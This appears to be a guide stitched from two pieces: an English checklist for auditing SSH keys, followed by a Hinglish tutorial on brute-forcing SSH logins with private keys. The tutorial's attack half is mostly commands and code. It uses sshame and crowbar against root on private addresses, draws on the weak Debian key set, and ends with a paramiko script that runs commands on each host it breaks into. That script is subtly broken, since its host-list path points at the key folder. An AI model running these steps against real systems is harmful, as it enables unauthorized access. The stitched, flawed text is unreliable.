SSH servers can be configured to allow authentication using public/private key pairs instead of passwords. During authorized security assessments, it may be necessary to verify whether recovered, issued, or managed private keys still provide access to systems.

- **Common scenarios include:**
    - Auditing organizational SSH key management.
    - Validating access associated with issued service accounts.
    - Identifying stale or unauthorized keys.
    - Verifying key rotation and revocation processes.
    - Assessing systems where password authentication is disabled.

## Key Assessment Objectives

### Verify Key Ownership

- **Review private keys discovered during:**
    - Asset inventories
    - Backup repositories
    - Configuration management systems
    - Source code repositories
    - Developer workstations
- **Determine:**
    - Who owns the key
    - When it was issued
    - Whether it is still authorized
    - Whether it complies with organizational policy

### Review Authorized Keys

On target systems, review the `authorized_keys` file:

Bash

```
cat ~/.ssh/authorized_keys
```

**Look for:**

- Unknown keys
- Former employee accounts
- Shared administrative keys
- Weak key types
- Duplicate entries

### Validate SSH Access

Using approved credentials, verify whether a key can authenticate to a system:

Bash

```
ssh -i ~/.ssh/id_ed25519 user@host
```

*Note: Successful authentication may indicate that the key remains authorized.*

### Review SSH Configuration

Inspect SSH server settings:

Bash

```
grep -E "PubkeyAuthentication|PasswordAuthentication" /etc/ssh/sshd_config
```

**Common settings:**

Plaintext

```
PubkeyAuthentication yes
PasswordAuthentication no
```

### Audit Key Types

List key fingerprints:

Bash

```
ssh-keygen -lf ~/.ssh/id_ed25519.pub
```

**Verify that approved algorithms are used:**

- **Ed25519** (recommended)
- **RSA 3072/4096-bit**
- **ECDSA** (where required)

*Avoid legacy or deprecated key types where possible.*

## Common Findings

### Stale Authorized Keys

Keys belonging to:

- Former employees
- Retired systems
- Deprecated automation accounts

### Shared Administrative Keys

Multiple users sharing the same private key can reduce accountability and complicate auditing.

### Unencrypted Private Keys

Private keys without passphrases increase risk if systems are compromised.

### Weak Key Management

**Examples:**

- Keys stored in repositories
- Keys distributed through insecure channels
- Missing rotation procedures
- Lack of inventory tracking

## 1. sshame — Interactive SSH Public-Key Brute-forcer

sshame ek Python-based, user-friendly tool hai jo SSH servers ko private keys ki list se bruteforce karta hai. Yeh multiple hosts aur users ko target karta hai, successful key/host/user matches report karta hai, aur sessions pe commands execute karta hai.

### Installation

```bash

cd sshame
pip install .
pip install sshame
```

### Basic Usage

```bash
# Tool start karo
sshame

# Help dekho
(sshame) help

# Targets load karo file se
hosts -f /home/someone/Documents/ip_add_ssh.txt

# Ya direct add karo
hosts -a 192.168.1.31

# Hosts list karo
hosts -l

# Private keys import karo
keys -a /home/someone/Downloads/debian_ssh_rsa_2048_x86/rsa/2048/*

# Keys test karo usernames ke against
test_keys -u root admin user

# Valid credentials list karo
creds -l

# Successfully accessed hosts pe command run karo
run_cmd -c whoami

# Results review karo
commands -r

# Session exit karo
quit
```

sshame advanced capabilities offer karta hai jaise batching aur session management — yeh red teamers, CTF players, aur penetration testers ke liye bahut powerful hai jab many keys aur multiple hosts hoon.

## 2. Crowbar — Command-line SSH Key Brute-force Tool

Crowbar rapidly SSH ko private keys se bruteforce kar sakta hai aur bahut scriptable hai.

### Installation

```bash
apt install crowbar
```

### Usage Example

```bash
# Key directory se bruteforce karo
crowbar -s 192.168.1.32/32 -p 22 -u root \
-k /home/armour/Downloads/debian_ssh_rsa_2048_x86/rsa/2048/ \
-v -b sshkey

# Single key file se
crowbar -s 192.168.1.32/32 -p 22 -u root \
-k /tmp/rsa -v -b sshkey
```

### Flags

```
-s : target(s)
-p : port
-u : username
-k : key file (or directory)
-b : backend/module (sshkey)
```

## 3. Custom Python Script (with Paramiko)

Jab zyada control chahiye ya special cases automate karne hoon, paramiko SSH Python library se apna script likh sakte hain.

### Script Banao

```bash
vim ssh-rsa-key-bruteforc.py
```

```python
import os
import paramiko

ips_file = "/home/armour/Downloads/debian_ssh_rsa_2048_x86/rsa/2048"
rsa_keys_folder = "/opt/rsa/private_key"

with open(ips_file, "r") as f:
    ips = [line.strip() for line in f]

for ip in ips:
    for rsa_key in os.listdir(rsa_keys_folder):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username='user',
                       key_filename=os.path.join(rsa_keys_folder, rsa_key))
            stdin, stdout, stderr = ssh.exec_command('hostname')
            print(f"Connected to {ip} using RSA key {rsa_key}. "
                  f"Hostname: {stdout.read().decode()}")
            ssh.close()
        except Exception as e:
            print(f"Failed to connect to {ip} using RSA key {rsa_key}: {e}")
```

### Run Karo

```bash
python ssh-rsa-key-bruteforc.py 2> /dev/null
```

## Summary

SSH ko public key se bruteforce karna ek legitimate risk hai especially jab default, common, ya previously compromised keys use mein hon. Penetration testers ko hamesha apne workflow mein yeh include karna chahiye jab keys acquire ho jayen ya password authentication restricted ho.

**Short mein: SSH Key Bruteforce = Passwords nahi, Private Keys se SSH access dhundhna!** 💪
